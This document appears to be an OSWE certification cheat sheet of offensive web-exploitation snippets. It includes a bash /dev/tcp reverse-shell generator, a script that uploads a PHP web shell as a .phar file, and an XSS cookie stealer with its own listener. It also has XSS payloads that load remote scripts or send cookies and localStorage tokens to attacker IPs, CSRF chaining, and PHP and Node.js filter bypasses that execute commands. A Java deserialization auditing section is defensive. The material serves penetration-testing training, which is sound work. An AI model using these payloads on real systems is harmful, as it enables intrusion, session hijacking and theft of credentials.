---
layout: python-code-snippets
title: Python Code Snippets
permalink: /python-code-snippets/
---

# OSWE

0. [Concepts](#Concepts)
4. [Enable Database Debug and Logging](#Enable-Database-Debug-and-Logging)
    - [Postgres](#Postgres)
    - [MySQL](#MySQL)
4. [Python Code Snippets](#Python-Code-Snippets)
    - [Starting Template](#Starting-Template)
    - [File Upload](#File-Upload)
    - [HTTP File Server](#HTTP-File-Server)
8. [XSS Payloads](#XSS-Payloads)
   - [Payload 1](#Payload-1)
   - [Payload 2](#Payload-2)
   - [XSS Cookies Stealer](#XSS-Cookies-Stealer)
   - [Leverage XSS to CSRF](#Leverage-XSS-to-CSRF)
5. [Java Code Snippets](#Java-Code-Snippets)
6. [Java Insecure Deserialization](#Java-Insecure-Deserialization)
    - [Methods and Classes](#Methods-and-Classes)
    - [Identify Insecure Deserialization in Source Code](#Identify-Insecure-Deserialization-in-Source-Code)
    - [Trace Input Sources](#Trace-Input-Sources)
    - [Check for Validation or Whitelisting](#Check-for-Validation-or-Whitelisting)
    - [Inspect Serializable Classes](#Inspect-Serializable-Classes)
7. [Regex Cheetsheet](#Regex-Cheetsheet)
8. [XSS Payloads](#XSS-Payloads)
9. [Bypass PHP Eval Filtering](#Bypass-PHP-Eval-Filtering)
10. [Bypass Javascript Injection Filters](#Bypass-Javascript-Injection-Filters)
11. [YSOSerial](#YSOSerial-Payload-Creation)
    - [.NET](#NET-Version)
    - [JAVA](#JAVA-Version)
12. [Report Recommedations](#Report-Recommendations)
13. [Additional Resources](#Additional-Resources)

# Concepts

### Authentication Bypass: 

- SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF vb.

### Remote Code Execution:

- SQLi, Javascript Injection, File upload, Deserialization, SSTI, Prototype Pollution, SSRF.

# Enable Database Debug and Logging

## Postgres

Edit your `/etc/postgresql/<version-num>/main/postgresql.conf`, and change the lines as follows.

Note: If you didn't find the postgresql.conf file, then just type `$locate postgresql.conf` in a terminal

Uncomment these fields:

1. `#log_directory = 'log'`
2. `#log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'`

Change these fileds values:

1. `#log_statement = 'none'` -> `log_statement = 'all'`
2. `#logging_collector = off` -> `logging_collector = on`
3. `sudo /etc/init.d/postgresql restart or sudo service postgresql restart`
4. Fire query in postgresql `select 2+2`.
5. Find current log in `/var/lib/postgresql/10/main/log`

## MySQL

Login to the MySQL instance and check out the `general_log` and values, whether is set to ON or OFF:

- `show variables like '%log%';`

If it's set to OFF, run the below command to switch it (as the root user!):

- `SET GLOBAL general_log = 1;`

Next, check the `general_log_file` value to see where the actual log file is located using the same.

# Python Code Snippets

## Starting Template

```python
import requests
import string
import re
import threading
import base64
import netifaces
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer

GREEN = '\033[92m'   # Bright Green
RED = '\033[91m'     # Bright Red
RESET = '\033[0m'    # Reset to default color

# Define reusable symbols

success = f"{GREEN}[+]{RESET}"
failure = f"{RED}[-]{RESET}"

proxies = {"http":"http://127.0.0.1:8080"}

def generate_b64revshell(listener_ip, listener_port):

    payload = f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
    payload_bytes = payload.encode('ascii')
    b64payload = base64.b64encode(payload_bytes)
    base64_payload = b64payload.decode('ascii')
    return base64_payload

def register():

    ## Register logic

def login():

    ## Login Logic

if __name__ == "__main__":

    # Parsers

    parser = argparse.ArgumentParser(description="Full chain to RCE in Answers Application")
    parser.add_argument('--target-ip', type=str, required=True, help="Specify the target IP Address.")
    parser.add_argument('--listener-ip', type=str, required=True, help="Specify the listener IP Address.")
    parser.add_argument('--listener-port', type=str, required=True, help="Specify the listener IP Address.")   
    args = parser.parse_args()

    target_ip = args.target_ip
    listener_ip = args.listener_ip
    listener_port = args.listener_port

    # Main Logic

    username, password = register()
    usercookies = login(username, password) 
```

---

## File Upload With Additional Parameters

```python
def uploadFile(phpsessid):

    url = "http://10.100.102.73:80/item/updateItem.php"

    payload_content = b"<?php system($_REQUEST['cmd']); ?>"
    pwny = io.BytesIO(payload_content)

    data = {
        "id": "1",
        "id_user": "1",
        "name": "Raspery Pi 4",
        "description": ("Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 "
                        "BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B"),
        "price": "92"
    }

    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.phar'
    files = {
        "image": (filename, pwny, "application/octet-stream")
    }
    
    cookies = {

        "PHPSESSID": phpsessid
    }

    r = requests.post(url, data=data, files=files, cookies=cookies, proxies=proxies, allow_redirects=False)
    loginheader = r.headers.get("Location", "")
    match = re.search(r'index\.php$', loginheader)
    if match:
        print(f"[+] Filename {filename} uploaded successfully!")
    else:
        print("[-] File is not uploaded.")
    return filename
```
---

## HTTP File Server 1

```python
from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer

LHOST      = "10.0.0.1"
WEB_PORT   = 8000
JS_PAYLOAD = "<script>alert(1)</script>"

def start_web_server():
    class MyHandler(BaseHTTPRequestHandler):
        # Uncomment this method to suppress HTTP logs
        # def log_message(self, format, *args):
        #     return

        def do_GET(self):
            if self.path.endswith('/payload.js'):
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(JS_PAYLOAD)))
                self.end_headers()
                self.wfile.write(JS_PAYLOAD.encode())
            
    httpd = HTTPServer((LHOST, WEB_PORT), MyHandler)
    threading.Thread(target=httpd.serve_forever).start()

start_web_server()
```

## HTTP File Server 2

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import os

def start_web_server(host="192.168.45.249", port=80, directory="."):
    os.chdir(directory)
    
    class MyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            try:
                file_path = os.path.join(directory, self.path.lstrip("/"))
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    self.send_response(200)
                    if file_path.endswith(".dtd"):
                        self.send_header("Content-type", "application/xml-dtd")
                    else:
                        self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    with open(file_path, "rb") as f:
                        self.wfile.write(f.read())
                else:
                    self.send_response(404)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"File not found")
            except Exception as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(f"Server error: {str(e)}".encode())

    httpd = HTTPServer((host, port), MyHandler)
    print(f"{success} Serving at {host}:{port}")
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd
```

## HTTP File Server 3

```python
import threading
import mimetypes

HOST = '0.0.0.0'
PORT = 8000
SERVE_DIR = '.'

def handle_client(conn, addr):
    print(f"{success} Connection from {addr}")
    try:
        # Receive request data
        request = conn.recv(1024).decode('utf-8')
        # print(f"Received request from {addr}: {request[:100]}...")  # Log first 100 chars        
        # Simple parsing: Extract the path from "GET /path HTTP/1.1"
        lines = request.split('\n')
        if lines and 'GET /' in lines[0]:
            path = lines[0].split(' ')[1]  # e.g., "/filename.txt"
            if path == '/':
                path = '/index.html'  # Optional: Default to index.html if root, but you can remove this
            full_path = os.path.join(SERVE_DIR, path.lstrip('/'))
            
            if os.path.exists(full_path) and os.path.isfile(full_path):
                # Read and send the file
                with open(full_path, 'rb') as f:
                    file_data = f.read()
                
                # Guess MIME type
                mime_type, _ = mimetypes.guess_type(full_path)
                if mime_type is None:
                    mime_type = 'application/octet-stream'
                
                # Basic HTTP response
                response = (
                    b'HTTP/1.1 200 OK\r\n'
                    b'Content-Type: ' + mime_type.encode('utf-8') + b'\r\n'
                    b'Content-Length: ' + str(len(file_data)).encode('utf-8') + b'\r\n'
                    b'\r\n'
                )
                conn.sendall(response + file_data)
                print(f"Served {full_path} ({len(file_data)} bytes) to {addr}")
            else:
                # 404 response
                response = b'HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nFile not found.'
                conn.sendall(response)
                print(f"File {full_path} not found for {addr}")
        else:
            # 400 for invalid request
            response = b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\n\r\nInvalid request.'
            conn.sendall(response)
    except Exception as e:
        print(f"Error handling {addr}: {e}")
    finally:
        conn.close()

def server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reuse of address
        s.bind((HOST, PORT))
        s.listen(5)  # Backlog of 5 for queued connections
        print(f"{success}Background file server listening on {HOST}:{PORT} ... (serving from {SERVE_DIR})")
        while True:
            conn, addr = s.accept()
            # Handle each client in a separate thread for concurrency
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.start()

# Start the server in a background thread (daemon=True so it exits when main does)
server_thread = threading.Thread(target=server, daemon=True)
server_thread.start()

# Main program continues here (non-blocking)
print(f"{success} File server started in background. Main program running...")
```

XSS Cookies Stealer

```python
def send_xss_payload():

    payload = "<script>document.location='http://10.100.102.67:9001/?c='+document.cookie</script>"
    data = {
        'title': 'test',
        'author': 'blabla',
        'text': payload,
        'submit': 'Submit'
    }

    proxies = {"http": "http://127.0.0.1:8080"}  # Use Burp or comment this out
    try:
        r = requests.post(TARGET_URL, data=data, proxies=proxies)
        if r.status_code == 200:
            print("XSS payload sent successfully.")
        else:
            print(f"Server responded with status code: {r.status_code}")
    except Exception as e:
        print(f"Error sending payload: {e}")

def listen_for_cookies():

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"Listening on {HOST}:{PORT} ...")
        print("Waiting for admin to trigger XSS...")

        conn, addr = s.accept()
        with conn:
            print(f"Connection from {addr}")
            data = conn.recv(2048)

            # Base64 encode for logging
            encoded_data = base64.b64encode(data).decode('utf-8')
            print(f"Base64 Encoded Request: " + encoded_data)

            decoded_data = data.decode('utf-8', errors='ignore')

            # Extract cookie
            match = re.search(r'PHPSESSID=([^;& ]+)', decoded_data)
            if match:
                cookie = match.group(1)
                print(f"PHPSESSID captured: " + cookie)
                return cookie
            else:
                print("PHPSESSID not found in received data.")

send_xss_payload()
listen_for_cookies()
```

---

## Java Insecure Deserialization

### Methods and Classes

- `ObjectInputStream.readObject()` - The primary method for deserializing objects in Java. It reads an object from an ObjectInputStream and reconstructs it.
- `ObjectInputStream.readUnshared()` - Similar to readObject(), but ensures the deserialized object is not shared with previously deserialized objects.
- `ObjectInputStream.readResolve()` - A special method that can be defined in a class to replace the deserialized object during deserialization.
- `ObjectInputStream.defaultReadObject()` - Used within a class’s readObject() method to perform default deserialization of non-transient fields.
- `XMLDecoder.readObject()` - Used to deserialize objects from XML input, typically in JavaBeans-style XML.
- `XStream.fromXML()` - Part of the XStream library, used to deserialize objects from XML.
- `ObjectMapper.readValue()` - Part of the Jackson library, used to deserialize JSON or other formats into Java objects.
- `Kryo.readObject()` - Part of the Kryo serialization library, used for high-performance serialization/deserialization.
- `SnakeYAML.load()` - Part of the SnakeYAML library, used to deserialize YAML into Java objects.

### Identify Insecure Deserialization in Source Code

When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:

### Search for Deserialization Methods

- Use code analysis tools (e.g., grep, IDE search, or static analysis tools like SonarQube) to find calls to the methods listed above (e.g., readObject, fromXML, readValue).

Example grep command:

- `grep -r "readObject" .`
- `grep -r "XStream\.fromXML ."`
- `grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .`
- `grep -r --include="*.java" -C 10 -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' . | grep -E -B 10 -A 10 '(HttpServletRequest|System\.in|FileInputStream|FileReader|Socket|ServerSocket|getParameter|getInputStream|getReader|request\.|input\.|stream\.|data\.)'`

### Trace Input Sources

- For each deserialization method, trace the input source (e.g., FileInputStream, Socket, HttpServletRequest).
- Check if the input is untrusted (e.g., user-uploaded files, network data, or external API responses).

### Check for Validation or Whitelisting:

Look for validation mechanisms, such as:

- Use of ObjectInputFilter (Java 9+) to restrict deserialized classes.

Example:

```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);
```

### Inspect Serializable Classes

- Identify classes implementing Serializable or Externalizable.
- Check for readObject(), readResolve(), or writeReplace() methods that could be exploited in gadget chains.

### Regex Cheetsheet

Match a START and END delimeter in `r.text`:

```python
r = requests.post(target, headers=headers, data=xml, proxies=proxies)
match = re.search(f'{re.escape("START DELIMETER")}(.*?){re.escape("END DELIMETER")}', r.text, re.DOTALL)
print(match[1].strip())
```

### Extract a cookie value from response headers:

Since we are searching for the `JSESSIONID` in r.headers, which is a `CaseInsensitiveDict` (likely from the requests library), you need to extract the Set-Cookie header as a string before applying the regex. Here's a simple and complete solution:

```
r = requests.post(target, headers=headers, data=xml, proxies=proxies)
set_cookie = r.headers.get('Set-Cookie', '')
match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
print(match.group(1))
```

## XSS Payloads

### Payloads

Load External JavaScript:

- `<img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" />`
- `<img src=x onerror=eval(atob("<BASE64 JAVASCRIPT PAYLOAD>"))>`
- `<audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"><source></audio>`
- `<iframe/srcdoc="<script/src=//192.168.45.163/worked.js></script>">`
- `<strong onafterscriptexecute=""><script src="http://192.168.45.163/worked.js"></script></strong>`


Load Inline JavaScript:

- `<audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"><source></audio>`
- `<audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()></audio>`
- `<audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"><source></audio>`
- `<video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))></video>`

Send localStorage `token` value from `user` key to remote resource:

```javascript
fetch(`http://192.168.45.159/data?data=${encodeURIComponent(JSON.parse(localStorage.getItem('user')).token)}`, {mode: 'no-cors'});```
```

### Leverage XSS to CSRF

Grab csrftoken and send HTTP request including csrftoken in the request:

```javascript
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
```

Filter specific cookie value, and send it back to us:

```javascript
function getCookieValue(name) {
    const cookieString = document.cookie;
    const cookies = cookieString.split('; ');
    for (let cookie of cookies) {
        const [key, value] = cookie.split('=');
        if (key === name) return value;
    }
    return null;
}

// Specify the cookie name you want to retrieve (replace 'auth' with your actual cookie name)
const cookieName = 'token';
const cookieValue = getCookieValue(cookieName);

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
req2.send();
```

Send request to specific endpoint with custom header, and send response back to us:

```javascript
function getCookieValue(name) {
    const cookieString = document.cookie;
    const cookies = cookieString.split('; ');
    for (let cookie of cookies) {
        const [key, value] = cookie.split('=');
        if (key === name) return value;
    }
    return null;
}

// Specify the cookie name you want to retrieve (replace 'auth' with your actual cookie name)
const cookieName = 'token';
const cookieValue = getCookieValue(cookieName);

// Send request using the token
var req = new XMLHttpRequest();
req.open('GET', 'http://192.168.136.243:8000/user/groups', false);
req.setRequestHeader('authorization', 'Bearer ' + token);
req.send();
var response = req.responseText;

// Send back the response to us
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.45.163/' + btoa(response), true);
req2.send();
```

# Bypass PHP Eval Filtering

```php
get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
(new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');
```

# Bypass Javascript Injection Filters

```javascript
(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //"
(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"
```

# YSOSerial Payload Creation

## NET Version

- `https://github.com/pwntester/ysoserial.net`

## JAVA Version

- `https://github.com/frohoff/ysoserial`

## Report Recommendations

For code identation:
- `Copy the code straight from VS Code into a 1x1 table in Word`

## Additional Resources

While the course material and labs should be enough to pass the exam, if you want further practice, I can recommend the following:
- https://github.com/yeswehack/vulnerable-code-snippets
- https://github.com/bmdyy/order
- https://github.com/bmdyy/chat.js
- https://github.com/bmdyy/tudo
- https://github.com/bmdyy/testr
- https://github.com/TROUBLE-1/White-box-pentesting
- https://www.vulnhub.com/entry/securecode-1,651
- https://github.com/takito1812/web-hacking-playground
- https://pentesterlab.com/badges/codereview (paid)
- https://github.com/b1d0ws/OSWE

Regex Learning:
- https://regexlearn.com/learn/

Debug VM Recommended RDP Software
- https://www.nomachine.com/
